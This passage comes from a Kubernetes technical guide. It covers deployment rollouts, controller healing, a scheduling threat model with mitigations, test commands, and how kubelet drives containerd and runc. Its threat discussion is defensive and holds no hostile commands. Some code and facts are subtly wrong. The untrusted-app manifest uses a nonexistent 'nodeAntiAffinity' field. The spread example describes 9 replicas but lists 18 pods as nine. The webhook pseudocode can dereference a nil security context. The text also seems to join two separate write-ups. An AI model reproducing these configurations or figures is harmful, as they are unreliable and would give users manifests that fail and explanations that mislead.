│         PATCH /apis/apps/v1/replicasets/{old} (scale=2)   │
└────────────────────────────────────────────────────────────┘

T=10s: New pod Running, old pod deleted
┌────────────────────────────────────────────────────────────┐
│ Deployment Controller OBSERVES:                           │
│ New RS: 1 Running                                         │
│ Old RS: 2 Running                                         │
│                                                            │
│ DECISION: Continue rollout                                │
│           Scale new RS: 1 → 2                             │
│           Scale old RS: 2 → 1                             │
└────────────────────────────────────────────────────────────┘

T=20s: 2 new pods Running, 1 old pod
┌────────────────────────────────────────────────────────────┐
│ Deployment Controller OBSERVES:                           │
│ New RS: 2 Running                                         │
│ Old RS: 1 Running                                         │
│                                                            │
│ DECISION: Continue rollout                                │
│           Scale new RS: 2 → 3                             │
│           Scale old RS: 1 → 0                             │
└────────────────────────────────────────────────────────────┘

T=30s: Rollout complete
┌────────────────────────────────────────────────────────────┐
│ Deployment Controller OBSERVES:                           │
│ New RS: 3 Running (nginx:1.25)                           │
│ Old RS: 0 Running                                         │
│                                                            │
│ DECISION: Rollout successful, mark complete               │
│ STATUS: Update deployment status                          │
└────────────────────────────────────────────────────────────┘
```

**Verify orchestration**:
```bash
# Watch rollout in real-time
kubectl rollout status deployment/nginx

# See ReplicaSet history
kubectl get rs
# NAME              DESIRED   CURRENT   READY   AGE
# nginx-6799fc88d8  3         3         3       2m   (new)
# nginx-7bf8c77b5b  0         0         0       10m  (old)

# View rollout history
kubectl rollout history deployment/nginx
# REVISION  CHANGE-CAUSE
# 1         <none>
# 2         kubectl set image deployment/nginx nginx=nginx:1.25
```

---

## Orchestration Controllers

### Built-in Controllers

| **Controller** | **Orchestration Decision** | **Example** |
|---------------|---------------------------|-------------|
| **ReplicaSet** | Maintain desired replica count | 3 desired, 2 actual → Create 1 pod |
| **Deployment** | Manage ReplicaSets, rolling updates | Image change → Create new RS, scale down old RS |
| **StatefulSet** | Ordered pod creation/deletion | Create pod-0, wait for Running, then pod-1 |
| **DaemonSet** | Ensure pod runs on every node | New node joins → Create pod on that node |
| **Job** | Run pods to completion | Pod succeeds → Mark job complete, optionally delete pod |
| **CronJob** | Schedule jobs on cron schedule | Every hour → Create Job → Create Pod |
| **Node Controller** | Monitor node health | Node NotReady > 40s → Taint, evict pods after 5m |
| **Service Controller** | Maintain endpoint lists | Pod IP changes → Update endpoint slice |
| **PV Controller** | Bind PVCs to PVs | New PVC → Find matching PV → Bind |
| **HPA (Horizontal Pod Autoscaler)** | Scale based on metrics | CPU > 80% → Scale replicas 3 → 5 |
| **VPA (Vertical Pod Autoscaler)** | Adjust resource requests | Memory usage 2Gi, request 1Gi → Recreate with 2Gi request |

### Example: Node Controller (Healing Decision)

```bash
# Simulate node failure
# On worker-1, stop kubelet
sudo systemctl stop kubelet
```

**Node controller orchestration**:

```
T=0s: Kubelet stops sending heartbeats
┌────────────────────────────────────────────────────────────┐
│ Node Controller OBSERVES:                                  │
│ Last heartbeat from node-1: 10s ago                       │
│                                                            │
│ DECISION: Wait (grace period = 40s)                       │
└────────────────────────────────────────────────────────────┘

T=40s: No heartbeat for 40s
┌────────────────────────────────────────────────────────────┐
│ Node Controller OBSERVES:                                  │
│ Last heartbeat: 40s ago                                   │
│                                                            │
│ DECISION: Mark node as NotReady                           │
│ ACTION: PATCH /api/v1/nodes/node-1 (condition: NotReady)  │
│         Add taint: node.kubernetes.io/unreachable:NoExecute│
└────────────────────────────────────────────────────────────┘

T=340s (5 minutes): Node still NotReady
┌────────────────────────────────────────────────────────────┐
│ Node Controller OBSERVES:                                  │
│ Node NotReady for 5 minutes                               │
│ Pods on node-1: nginx-abc, redis-xyz                      │
│                                                            │
│ DECISION: Evict pods (delete from API server)             │
│ ACTION: DELETE /api/v1/pods/nginx-abc                     │
│         DELETE /api/v1/pods/redis-xyz                     │
└────────────────────────────────────────────────────────────┘

T=350s: Pods deleted
┌────────────────────────────────────────────────────────────┐
│ ReplicaSet Controller OBSERVES:                           │
│ Desired: 3 replicas                                        │
│ Actual: 2 replicas (nginx-abc deleted)                    │
│                                                            │
│ DECISION: Create replacement pod                          │
│ ACTION: POST /api/v1/pods                                 │
└────────────────────────────────────────────────────────────┘

T=360s: Scheduler assigns new pod to node-2
┌────────────────────────────────────────────────────────────┐
│ System state:                                              │
│ node-1: NotReady, no pods                                 │
│ node-2: Running nginx-abc (replacement)                   │
│ Workload recovered on healthy node                        │
└────────────────────────────────────────────────────────────┘
```

**Verify node controller behavior**:
```bash
# Check node status
kubectl get nodes
# NAME     STATUS     ROLES    AGE
# node-1   NotReady   <none>   10m

# Check node conditions
kubectl describe node node-1 | grep -A 5 Conditions
# Conditions:
#   Type             Status    Reason
#   Ready            False     NodeStatusUnknown

# Check taints
kubectl describe node node-1 | grep Taints
# Taints: node.kubernetes.io/unreachable:NoExecute

# See pods evicted
kubectl get events --field-selector involvedObject.name=node-1
# REASON              MESSAGE
# NodeNotReady        Node node-1 status is now: NotReady
# TaintManagerEviction  Evicting pod nginx-abc
```

---

## Security Implications of Scheduling/Orchestration

### Threat Model

| **Attack Vector** | **Scheduling/Orchestration Risk** | **Mitigation** |
|------------------|----------------------------------|----------------|
| **Co-location attack** | Attacker schedules pod on same node as victim, exploits side-channel (CPU cache timing) | PodAntiAffinity to separate sensitive workloads, dedicated node pools, node taints |
| **Scheduler bypass** | Attacker with CREATE pod permission sets `nodeName` directly, bypassing scheduler | Admission webhook validates `nodeName` is null, RBAC restricts pod creation |
| **Resource exhaustion** | Attacker creates pods without limits, starves other workloads | LimitRange enforces defaults, ResourceQuota caps namespace usage, PodPriority for critical workloads |
| **Malicious controller** | Compromised controller creates backdoor pods, modifies deployments | RBAC restricts controller service accounts, audit logs for suspicious creates/updates, admission webhooks |
| **Node taint removal** | Attacker removes taints, schedules on control plane nodes | RBAC denies `nodes/taint` update, PodSecurityPolicy/Standards prevents `nodeName` override |
| **Priority preemption abuse** | High-priority pod evicts critical workloads | Limit who can create PriorityClasses, use PodDisruptionBudget to prevent cascading failures |

### Example: Prevent Co-location of Sensitive Workloads

**Scenario**: Database and untrusted user workloads must not run on same node.

```yaml
# Database deployment with anti-affinity
apiVersion: apps/v1
kind: Deployment
metadata:
  name: postgres
spec:
  replicas: 3
  selector:
    matchLabels:
      app: postgres
  template:
    metadata:
      labels:
        app: postgres
        security: high
    spec:
      affinity:
        # Don't schedule on nodes with untrusted workloads
        podAntiAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
          - labelSelector:
              matchExpressions:
              - key: security
                operator: In
                values:
                - untrusted
            topologyKey: kubernetes.io/hostname
      nodeSelector:
        workload-type: database
      containers:
      - name: postgres
        image: postgres:15
        resources:
          requests:
            cpu: 2000m
            memory: 4Gi
          limits:
            cpu: 4000m
            memory: 8Gi
```

```yaml
# Untrusted workload deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: user-app
spec:
  replicas: 10
  selector:
    matchLabels:
      app: user-app
  template:
    metadata:
      labels:
        app: user-app
        security: untrusted
    spec:
      affinity:
        # Don't schedule on database nodes
        nodeAntiAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
          - matchExpressions:
            - key: workload-type
              operator: In
              values:
              - database
      containers:
      - name: app
        image: user-app:1.0
```

**Enforce with admission webhook**:

```yaml
# ValidatingWebhookConfiguration
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: prevent-privileged-pods
webhooks:
- name: validate-pod-security.example.com
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  clientConfig:
    service:
      name: webhook-service
      namespace: webhook
      path: "/validate"
  admissionReviewVersions: ["v1"]
  sideEffects: None
  failurePolicy: Fail  # Reject if webhook unavailable
```

**Webhook logic** (pseudocode):
```go
func validatePod(pod *v1.Pod) error {
    // Reject if nodeName is set (bypassing scheduler)
    if pod.Spec.NodeName != "" {
        return fmt.Errorf("spec.nodeName must be empty")
    }
    
    // Enforce resource limits
    for _, c := range pod.Spec.Containers {
        if c.Resources.Limits.Cpu().IsZero() {
            return fmt.Errorf("CPU limit required")
        }
    }
    
    // Enforce security context
    if pod.Spec.SecurityContext.RunAsNonRoot == nil {
        return fmt.Errorf("runAsNonRoot must be true")
    }
    
    return nil
}
```

---

## Advanced Scheduling Patterns

### 1. Topology-Aware Scheduling (Zone/Region Distribution)

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: frontend
spec:
  replicas: 9
  selector:
    matchLabels:
      app: frontend
  template:
    metadata:
      labels:
        app: frontend
    spec:
      topologySpreadConstraints:
      # Spread across zones (max skew = 1)
      - maxSkew: 1
        topologyKey: topology.kubernetes.io/zone
        whenUnsatisfiable: DoNotSchedule
        labelSelector:
          matchLabels:
            app: frontend
      # Spread across nodes in same zone (max skew = 2)
      - maxSkew: 2
        topologyKey: kubernetes.io/hostname
        whenUnsatisfiable: ScheduleAnyway
        labelSelector:
          matchLabels:
            app: frontend
```

**Result**:
```
Zone us-west-1a: node-1 (3 pods), node-2 (3 pods)
Zone us-west-1b: node-3 (3 pods), node-4 (3 pods)
Zone us-west-1c: node-5 (3 pods), node-6 (3 pods)
Total: 9 pods evenly distributed across 3 zones
```

### 2. Priority-Based Preemption

```yaml
# High-priority pod
apiVersion: v1
kind: Pod
metadata:
  name: critical-pod
spec:
  priorityClassName: system-cluster-critical  # priority: 2000000000
  containers:
  - name: nginx
    image: nginx
    resources:
      requests:
        cpu: 2000m
```

**Orchestration decision**:
```
Cluster state:
- node-1: 4 vCPU capacity, 4 vCPU allocated (no space)
- critical-pod needs 2 vCPU

Scheduler decision:
1. No node has 2 vCPU available
2. critical-pod has priority 2000000000
3. Find lower-priority pods to preempt
4. Preempt "user-app-abc" (priority 0, uses 2 vCPU)
5. Evict user-app-abc
6. Schedule critical-pod on node-1
```

**Verify**:
```bash
kubectl get events --sort-by='.lastTimestamp' | grep Preempted
# user-app-abc  Preempted  Preempted by critical-pod on node node-1
```

### 3. Custom Scheduler

```yaml
# Deploy custom scheduler
apiVersion: apps/v1
kind: Deployment
metadata:
  name: custom-scheduler
  namespace: kube-system
spec:
  replicas: 1
  selector:
    matchLabels:
      component: custom-scheduler
  template:
    metadata:
      labels:
        component: custom-scheduler
    spec:
      serviceAccountName: custom-scheduler
      containers:
      - name: scheduler
        image: my-custom-scheduler:1.0
        command:
        - /custom-scheduler
        - --config=/config/scheduler-config.yaml
        - --leader-elect=false
```

**Use custom scheduler**:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: ml-workload
spec:
  schedulerName: custom-scheduler  # Use custom scheduler instead of default
  containers:
  - name: tensorflow
    image: tensorflow/tensorflow:latest-gpu
```

---

## Testing & Validation

```bash
# 1. Test scheduling predicates
# Create pod that should fail scheduling (insufficient resources)
kubectl run test-large --image=nginx --restart=Never \
  --requests='cpu=100,memory=100Ti'

kubectl get pod test-large
# STATUS: Pending

kubectl describe pod test-large | grep -A 5 Events
# Warning  FailedScheduling  0/3 nodes available: insufficient memory

# 2. Test pod affinity
kubectl label node node-1 zone=us-west-1a
kubectl label node node-2 zone=us-west-1b

cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: test-affinity
spec:
  affinity:
    nodeAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        nodeSelectorTerms:
        - matchExpressions:
          - key: zone
            operator: In
            values:
            - us-west-1a
  containers:
  - name: nginx
    image: nginx
EOF

kubectl get pod test-affinity -o wide
# Should be on node-1 (zone=us-west-1a)

# 3. Test orchestration (self-healing)
# Delete pod, watch ReplicaSet recreate it
kubectl delete pod nginx-abc

kubectl get pods -w
# nginx-abc  1/1  Running  0  10s
# nginx-abc  1/1  Terminating  0  10s
# nginx-xyz  0/1  Pending  0  0s   ← New pod created
# nginx-xyz  0/1  ContainerCreating  0  1s
# nginx-xyz  1/1  Running  0  5s

# 4. Test rolling update orchestration
kubectl set image deployment/nginx nginx=nginx:1.25
kubectl rollout status deployment/nginx

# Watch pods being replaced
kubectl get pods -l app=nginx -w
# nginx-old-1  1/1  Running  0  10m
# nginx-old-2  1/1  Running  0  10m
# nginx-old-3  1/1  Running  0  10m
# nginx-new-1  0/1  Pending  0  0s   ← New pod
# nginx-new-1  1/1  Running  0  5s
# nginx-old-1  1/1  Terminating  0  10m  ← Old pod deleted
# ...

# 5. Simulate node failure, test eviction orchestration
# Cordon node (prevent new scheduling)
kubectl cordon node-1

# Drain node (evict all pods)
kubectl drain node-1 --ignore-daemonsets --delete-emptydir-data

# Verify pods rescheduled
kubectl get pods -o wide | grep node-1
# (empty - no pods on node-1)

kubectl get pods -o wide | grep node-2
# nginx-abc  1/1  Running  node-2  ← Rescheduled

# 6. Test HPA orchestration
kubectl autoscale deployment nginx --cpu-percent=50 --min=3 --max=10

# Generate load
kubectl run load-generator --image=busybox --restart=Never -- \
  /bin/sh -c "while true; do wget -q -O- http://nginx; done"

# Watch HPA scale up
kubectl get hpa -w
# NAME    REFERENCE          TARGETS   MINPODS   MAXPODS   REPLICAS
# nginx   Deployment/nginx   0%/50%    3         10        3
# nginx   Deployment/nginx   85%/50%   3         10        3
# nginx   Deployment/nginx   85%/50%   3         10        5  ← Scaled up

# 7. Benchmark scheduling throughput
# Create 1000 pods, measure time to schedule
kubectl create namespace benchmark
kubectl run test --image=pause --replicas=0 -n benchmark
kubectl scale deployment test --replicas=1000 -n benchmark

time kubectl wait --for=condition=Ready pod -l app=test -n benchmark --timeout=300s
# Typical: 30-60 seconds for 1000 pods on 3-node cluster

# 8. Test scheduler load balancing
# Create deployment, verify even distribution
kubectl create deployment test --image=nginx --replicas=12
kubectl get pods -o wide | awk '{print $7}' | sort | uniq -c
# Expected output (3 nodes):
#   4 node-1
#   4 node-2
#   4 node-3
```

---

## Failure Modes

| **Failure** | **Impact** | **Detection** | **Recovery** |
|-----------|----------|-------------|------------|
| **Scheduler crash** | New pods stuck in Pending | `kubectl get pods` shows Pending, no events | Restart scheduler (self-healing via static pod/DaemonSet) |
| **Controller crash** | No reconciliation (no scaling, healing) | Deployments don't update, pods not replaced | Restart controller-manager |
| **Incorrect affinity** | Pods unschedulable (0/N nodes available) | Describe pod shows "FailedScheduling" | Fix affinity rules, add matching nodes |
| **Resource overcommit** | Node OOM, pods evicted | Node NotReady, pods Evicted status | Set resource limits, use ResourceQuota |
| **Scheduler hot path** | One node gets all pods | `kubectl get pods -o wide` shows uneven distribution | Fix scheduling logic, use spread constraints |
| **Infinite reconciliation** | Controller thrashing (create/delete loop) | High API server load, controller logs show repeated actions | Fix controller logic (status update only when changed) |

---

## Next 3 Steps

1. **Implement custom scheduler plugin**: Write a Go plugin that scores nodes based on custom metrics (e.g., GPU temperature, network latency to external service). Deploy as webhook, configure scheduler to use it, benchmark scheduling decisions.
   ```bash
   # Scheduler framework extension points:
   # PreFilter, Filter, PreScore, Score, Reserve, Permit, PreBind, Bind, PostBind
   ```

2. **Build a custom controller with controller-runtime**: Use Kubebuilder to scaffold a controller that reconciles a custom resource (e.g., `BackupPolicy`). Implement watch logic, reconciliation loop with exponential backoff, status updates. Test failure scenarios (API server unreachable, resource conflicts).
   ```bash
   kubebuilder init --domain example.com
   kubebuilder create api --group batch --version v1 --kind BackupPolicy
   make install run
   ```

3. **Stress test scheduling and orchestration**: Deploy 10,000 pods across 50 nodes, measure scheduler latency (watch events), inject node failures (kill kubelet randomly), verify pod re-scheduling time, test HPA under high load (CPU/memory pressure), analyze etcd latency under write-heavy workloads.

---

## References

- **Scheduler Design**: https://kubernetes.io/docs/concepts/scheduling-eviction/kube-scheduler/
- **Controller Pattern**: https://kubernetes.io/docs/concepts/architecture/controller/
- **Scheduling Framework**: https://kubernetes.io/docs/concepts/scheduling-eviction/scheduling-framework/
- **Controller Runtime**: https://github.com/kubernetes-sigs/controller-runtime
- **Scheduling Policies**: https://kubernetes.io/docs/reference/scheduling/policies/
- **Custom Scheduler**: https://kubernetes.io/docs/tasks/extend-kubernetes/configure-multiple-schedulers/

## Summary

Kubernetes does **NOT** start/stop containerd itself—containerd runs as an independent system service (systemd unit) that starts on boot. **Kubelet** (Kubernetes node agent) communicates with containerd via **CRI (Container Runtime Interface)** gRPC API to manage container lifecycle. When a pod is scheduled, kubelet calls containerd to pull images and create/start containers; when a pod is deleted, kubelet calls containerd to stop/remove containers. containerd delegates low-level operations (namespace setup, cgroups) to **runc** (OCI runtime). If containerd crashes, existing containers keep running (orphaned), but kubelet can't manage new containers until containerd restarts. This separation creates security boundaries: kubelet compromise doesn't directly access containers, containerd compromise doesn't own cluster state.

---

## Architecture: Kubernetes → containerd → runc → Containers

```
┌─────────────────────────────────────────────────────────────────┐
│                    KUBERNETES CONTROL PLANE                     │
│  (kube-apiserver, etcd, scheduler, controllers)                 │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                          │ API calls (HTTPS 6443)
                          │ "Create Pod: nginx, image: nginx:1.25"
                          │
┌─────────────────────────▼───────────────────────────────────────┐
│                         NODE (worker-1)                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │  KUBELET (Kubernetes Node Agent)                          │ │
│  │  • Watches API server for pods assigned to this node      │ │
│  │  • Manages pod lifecycle (create, update, delete)         │ │
│  │  • Does NOT directly interact with containers             │ │
│  │  • Calls containerd via CRI gRPC                          │ │
│  └────────────────────┬───────────────────────────────────────┘ │
│                       │                                         │
│                       │ CRI gRPC (Unix socket)                  │
│                       │ /run/containerd/containerd.sock         │
│                       │                                         │
│  ┌────────────────────▼───────────────────────────────────────┐ │
│  │  CONTAINERD (Container Runtime - systemd service)         │ │
│  │  • Runs as systemd unit (starts on boot)                  │ │
│  │  • Exposes CRI API (gRPC server)                          │ │
│  │  • Image management (pull, list, remove)                  │ │
│  │  • Container lifecycle (create, start, stop, delete)      │ │
│  │  • Does NOT directly create namespaces/cgroups            │ │
│  │  • Calls runc for low-level operations                    │ │
│  └────────────────────┬───────────────────────────────────────┘ │
│                       │                                         │
│                       │ OCI Runtime Spec                        │
│                       │ JSON config describing container        │
│                       │                                         │
│  ┌────────────────────▼───────────────────────────────────────┐ │
│  │  RUNC (OCI Runtime - binary executable)                   │ │
│  │  • Low-level container operations                         │ │
│  │  • Creates Linux namespaces (PID, NET, MNT, IPC, UTS)     │ │
│  │  • Sets up cgroups for resource limits                    │ │
│  │  • Applies seccomp, AppArmor, SELinux, capabilities       │ │
│  │  • Execs container process (PID 1 in container)           │ │
│  │  • Exits after container starts (not a long-running daemon)│ │
│  └────────────────────┬───────────────────────────────────────┘ │
│                       │                                         │
│                       │ fork/exec                               │
│                       │                                         │
│  ┌────────────────────▼───────────────────────────────────────┐ │
│  │  CONTAINER PROCESSES (running in namespaces)              │ │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐    │ │
│  │  │ nginx (PID 1)│  │redis (PID 1) │  │postgres      │    │ │
│  │  │ in ns: 12345 │  │in ns: 12346  │  │(PID 1)       │    │ │
│  │  └──────────────┘  └──────────────┘  │in ns: 12347  │    │ │
│  │                                      └──────────────┘    │ │
│  │  Each container has isolated:                            │ │
│  │  • PID namespace (own process tree)                      │ │
│  │  • Network namespace (own IP, routes, iptables)          │ │
│  │  • Mount namespace (own filesystem view)                 │ │
│  │  • cgroups (CPU/memory limits enforced by kernel)        │ │
│  └──────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘
```

---

## Component Lifecycle Management

### 1. containerd Lifecycle (Managed by systemd, NOT Kubernetes)

containerd is a **system service** that runs independently of Kubernetes:

```bash
# Check containerd systemd unit
systemctl status containerd

# Output:
● containerd.service - containerd container runtime
   Loaded: loaded (/lib/systemd/system/containerd.service; enabled)
   Active: active (running) since Mon 2026-01-18 10:00:00 UTC; 5 days ago
   Process: 1234 ExecStartPre=/sbin/modprobe overlay
   Main PID: 1235 (containerd)
   Tasks: 150
   Memory: 1.2G
   CGroup: /system.slice/containerd.service
           └─1235 /usr/bin/containerd

# containerd starts BEFORE kubelet
# Typically enabled in systemd so it auto-starts on boot
```

**containerd systemd unit file** (`/lib/systemd/system/containerd.service`):
```ini
[Unit]
Description=containerd container runtime
Documentation=https://containerd.io
After=network.target local-fs.target

[Service]
ExecStartPre=-/sbin/modprobe overlay
ExecStart=/usr/bin/containerd
Type=notify
Delegate=yes
KillMode=process
Restart=always
RestartSec=5
LimitNOFILE=1048576
LimitNPROC=infinity
LimitCORE=infinity

[Install]
WantedBy=multi-user.target
```

**Key points**:
- containerd is a **long-running daemon** (always running)
- Starts on boot (`enabled` in systemd)
- Kubernetes does NOT start/stop containerd
- If containerd crashes, systemd restarts it (`Restart=always`)

### 2. Kubelet Lifecycle (Managed by systemd)

Kubelet is also a system service:

```bash
# Check kubelet systemd unit
systemctl status kubelet

# Output:
● kubelet.service - kubelet: The Kubernetes Node Agent
   Loaded: loaded (/lib/systemd/system/kubelet.service; enabled)
   Active: active (running) since Mon 2026-01-18 10:01:00 UTC; 5 days ago
   Process: 5678 ExecStart=/usr/bin/kubelet
   Main PID: 5678 (kubelet)
   Tasks: 50
   Memory: 512M
   CGroup: /system.slice/kubelet.service
           └─5678 /usr/bin/kubelet --config=/var/lib/kubelet/config.yaml
```

**Kubelet systemd unit** (`/lib/systemd/system/kubelet.service`):
```ini
[Unit]
Description=kubelet: The Kubernetes Node Agent
Documentation=https://kubernetes.io/docs/
Wants=network-online.target
After=network-online.target

[Service]
ExecStart=/usr/bin/kubelet \
  --config=/var/lib/kubelet/config.yaml \
  --container-runtime-endpoint=unix:///run/containerd/containerd.sock
Restart=always
StartLimitInterval=0
RestartSec=10

[Install]
WantedBy=multi-user.target
```

**Key configuration**:
```yaml
# /var/lib/kubelet/config.yaml
apiVersion: kubelet.config.k8s.io/v1beta1
kind: KubeletConfiguration
containerRuntimeEndpoint: unix:///run/containerd/containerd.sock
imageServiceEndpoint: unix:///run/containerd/containerd.sock
```

---

## Container Lifecycle: From Pod Creation to Container Execution

### Step-by-Step Flow

```
┌────────────────────────────────────────────────────────────────┐
│  STEP 1: User creates pod                                      │
└────────────────────────────────────────────────────────────────┘

$ kubectl run nginx --image=nginx:1.25
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  API Server persists pod object to etcd                        │
│  Pod status: Pending (no node assigned)                        │
└────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────┐
│  STEP 2: Scheduler assigns pod to node                         │
└────────────────────────────────────────────────────────────────┘

Scheduler watches for unscheduled pods
→ Finds pod with spec.nodeName = null
→ Scores nodes (resources, affinity, taints)
→ Binds pod to worker-1 (updates spec.nodeName = "worker-1")
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 3: Kubelet on worker-1 watches API server                │
└────────────────────────────────────────────────────────────────┘

Kubelet watches: GET /api/v1/pods?fieldSelector=spec.nodeName=worker-1
Detects new pod assigned to this node
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 4: Kubelet prepares pod environment                      │
└────────────────────────────────────────────────────────────────┘

• Creates pod-level cgroup (pod-uid)
• Mounts volumes (EmptyDir, ConfigMap, Secret, PV)
• Fetches image pull secrets (if private registry)
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 5: Kubelet calls containerd via CRI (gRPC)               │
└────────────────────────────────────────────────────────────────┘

Kubelet → CRI gRPC → containerd socket (/run/containerd/containerd.sock)

gRPC call: PullImage
Request: {
  image: "nginx:1.25",
  auth: <image-pull-secret>
}
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 6: containerd pulls image                                │
└────────────────────────────────────────────────────────────────┘

containerd → Docker Hub / Private Registry
• Downloads image layers (SHA256 verified)
• Stores in /var/lib/containerd/io.containerd.content.v1.content/
• Unpacks layers to /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 7: Kubelet calls containerd to create sandbox            │
└────────────────────────────────────────────────────────────────┘

gRPC call: RunPodSandbox
Request: {
  pod_name: "nginx-abc",
  namespace: "default",
  hostname: "nginx-abc",
  dns_config: {...},
  port_mappings: [{container_port: 80}]
}

containerd creates "pause" container (pod sandbox):
• Holds network namespace for entire pod
• All containers in pod share this network namespace
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 8: containerd calls runc to create pause container       │
└────────────────────────────────────────────────────────────────┘

containerd → runc create
runc:
1. Creates namespaces (PID, NET, MNT, IPC, UTS)
2. Sets up network namespace (veth pair, IP assignment via CNI)
3. Creates cgroups (/sys/fs/cgroup/kubepods/pod<uid>/pause)
4. Starts pause process (sleeps forever, holds namespaces)
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 9: Kubelet calls containerd to create application container│
└────────────────────────────────────────────────────────────────┘

gRPC call: CreateContainer
Request: {
  pod_sandbox_id: "abc123",
  container_name: "nginx",
  image: "nginx:1.25",
  command: [],  # Uses image CMD
  env: [{name: "ENV_VAR", value: "value"}],
  mounts: [{host_path: "/var/lib/kubelet/pods/<uid>/volumes", container_path: "/etc/config"}],
  linux: {
    security_context: {
      namespace_options: {
        network: POD,  # Share network with pause container
        pid: CONTAINER,  # Own PID namespace
        ipc: POD  # Share IPC with pause container
      },
      run_as_user: {value: 101},
      capabilities: {drop: ["ALL"]},
      seccomp_profile_path: "/var/lib/kubelet/seccomp/runtime/default"
    },
    resources: {
      cpu_quota: 100000,  # 1 vCPU
      cpu_period: 100000,
      memory_limit_in_bytes: 1073741824  # 1GB
    }
  }
}
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 10: containerd calls runc to create nginx container      │
└────────────────────────────────────────────────────────────────┘

containerd → runc create
runc:
1. Joins network namespace from pause container
2. Creates own PID, MNT namespaces
3. Sets up cgroups with CPU/memory limits
4. Applies seccomp, AppArmor, capabilities
5. Mounts rootfs from image layers (overlayfs)
6. Pivots root to container filesystem
7. Drops capabilities (ALL except permitted)
8. Sets UID/GID (101:101)
9. Execs nginx process (becomes PID 1 in container)
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 11: Container running                                    │
└────────────────────────────────────────────────────────────────┘

nginx process running with:
• PID 1 in its own PID namespace (appears as PID 12345 on host)
• Network namespace shared with pause container
• cgroup limits enforced by kernel
• seccomp filtering syscalls
• AppArmor/SELinux confining file access
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 12: Kubelet updates pod status to API server             │
└────────────────────────────────────────────────────────────────┘

Kubelet → API Server:
PATCH /api/v1/namespaces/default/pods/nginx-abc/status
{
  status: {
    phase: "Running",
    containerStatuses: [{
      name: "nginx",
      state: {running: {startedAt: "2026-01-18T10:00:00Z"}},
      ready: true,
      containerID: "containerd://abc123def456"
    }]
  }
}
```

### Verification Commands

```bash
# 1. Check kubelet connected to containerd
sudo journalctl -u kubelet | grep "container runtime"
# Using remote runtime endpoint: unix:///run/containerd/containerd.sock

# 2. List containers via containerd (bypassing kubelet)
sudo ctr --namespace k8s.io containers list
# CONTAINER                                    IMAGE        RUNTIME
# abc123def456                                 nginx:1.25   io.containerd.runc.v2

# 3. Check container process on host
ps aux | grep nginx
# UID   PID   PPID  CMD
# 101   12345 12340 nginx: master process nginx -g daemon off;
# 101   12350 12345 nginx: worker process

# 4. Find container namespaces
sudo lsns -p 12345
# NS         TYPE   NPROCS   PID   COMMAND
# 4026532501 mnt    2        12345 nginx: master process
# 4026532502 uts    2        12345 nginx: master process
# 4026532503 ipc    3        12340 /pause  (shared with pause)
# 4026532504 pid    2        12345 nginx: master process
# 4026532505 net    3        12340 /pause  (shared with pause)

# 5. Check cgroups
cat /sys/fs/cgroup/kubepods/burstable/pod<uid>/nginx/cgroup.procs
# 12345
# 12350

cat /sys/fs/cgroup/kubepods/burstable/pod<uid>/nginx/memory.max
# 1073741824  (1GB limit)

# 6. Verify containerd is managing container
sudo crictl ps
# CONTAINER ID   IMAGE           CREATED        STATE     NAME    POD ID
# abc123def456   nginx:1.25      5 minutes ago  Running   nginx   xyz789

# 7. Check CRI gRPC communication
sudo ss -xpl | grep containerd.sock
# u_str  LISTEN  0  4096  /run/containerd/containerd.sock 12345  * 0
```

---

## Container Stop/Deletion Flow

```
┌────────────────────────────────────────────────────────────────┐
│  STEP 1: User deletes pod                                      │
└────────────────────────────────────────────────────────────────┘

$ kubectl delete pod nginx-abc
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  API Server marks pod for deletion (graceful termination)      │
│  Pod status: Terminating                                       │
│  deletionTimestamp: 2026-01-18T10:05:00Z                      │
│  deletionGracePeriodSeconds: 30                               │
└────────────────────────────────────────────────────────────────┘
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 2: Kubelet detects pod deletion                          │
└────────────────────────────────────────────────────────────────┘

Kubelet watches for pod updates
Sees deletionTimestamp set
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 3: Kubelet runs preStop hook (if defined)                │
└────────────────────────────────────────────────────────────────┘

If pod has lifecycle.preStop:
  exec: {command: ["/bin/sh", "-c", "nginx -s quit"]}
  OR
  httpGet: {path: "/shutdown", port: 8080}

Kubelet executes preStop, waits for completion
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 4: Kubelet calls containerd to stop container            │
└────────────────────────────────────────────────────────────────┘

gRPC call: StopContainer
Request: {
  container_id: "abc123def456",
  timeout: 30  # Grace period
}
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 5: containerd sends SIGTERM to container process         │
└────────────────────────────────────────────────────────────────┘

containerd → kill(12345, SIGTERM)
nginx process receives SIGTERM
nginx begins graceful shutdown (finishes existing requests)
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
